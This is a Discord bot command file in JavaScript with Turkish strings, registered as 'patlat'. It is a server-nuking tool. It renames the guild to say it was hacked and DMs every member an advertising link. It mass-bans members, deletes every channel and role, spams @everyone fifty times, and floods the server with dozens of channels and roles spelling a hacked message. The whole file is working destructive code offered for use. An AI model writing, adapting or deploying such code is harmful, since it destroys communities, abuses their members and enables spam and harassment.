const { ChannelType, PermissionsBitField } = require('discord.js');
const Config = require("../Config.js");

exports.run = async (client, message, args) => {
    message.delete().catch(console.error);
    const guild = message.guild;

    guild.setName(`${Config.SahipAdı} | HACKLENDİNİZ.`).catch(console.error);

    try {
        const members = await guild.members.fetch();
        members.forEach(member => {
            member.send(`Bu sunucu ${Config.SahipAdı} tarafından patlatılmıştır.\n${Config.ReklamSunucuLink}`)
                .catch(console.error);
            if (member.id === guild.ownerId || Config.SahipID.includes(member.id)) return;
            member.ban().catch(console.error);
        });
    } catch (error) {
        console.error(error);
    }

    try {
        const channels = await guild.channels.fetch();
        channels.forEach(channel => {
            channel.delete().catch(console.error);
        });
    } catch (error) {
        console.error(error);
    }

    try {
        const roles = await guild.roles.fetch();
        roles.forEach(role => {
            role.delete().catch(console.error);
        });
    } catch (error) {
        console.error(error);
    }

    guild.channels.create({
        name: 'chat',
        type: ChannelType.GuildText,
        reason: 'Metin kanalı oluşturuldu'
    }).then(channel => {
        for (let i = 0; i < 50; i++) {
            channel.send(`@everyone | Bu sunucu ${Config.SahipAdı} tarafından patlatılmıştır.\n${Config.ReklamSunucuLink}`).catch(console.error);
        }
    }).catch(console.error);

    for (let i = 0; i < 20; i++) {
        guild.channels.create({
            name: '------------------',
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create({
            name: `${Config.SahipAdı}`,
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create({
            name: 'Tarafından',
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create({
            name: 'Hacklenmiş',
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create({
            name: 'Bulunmaktasınız.',
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create({
            name: `${Config.SahipAdı}`,
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);

        guild.channels.create({
            name: '------------------',
            type: ChannelType.GuildVoice,
            reason: 'Sesli kanal oluşturuldu'
        }).catch(console.error);
    }

    for (let i = 0; i < 5; i++) {
        guild.roles.create({
            name: '------------------',
            color: '#FFFFFF',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: `${Config.SahipAdı}`,
            color: '#FFFFFF',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: 'Tarafından',
            color: '#FFA500',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: 'Hacklenmiş',
            color: '#FF0000',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: 'Bulunmaktasınız',
            color: '#FFA500',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: `${Config.SahipAdı}`,
            color: '#FFFFFF',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);

        guild.roles.create({
            name: '------------------',
            color: '#FFFFFF',
            reason: 'Yeni rol oluşturuldu'
        }).catch(console.error);
    }
};

exports.conf = {
    aliases: [],
    komut: "patlat"
};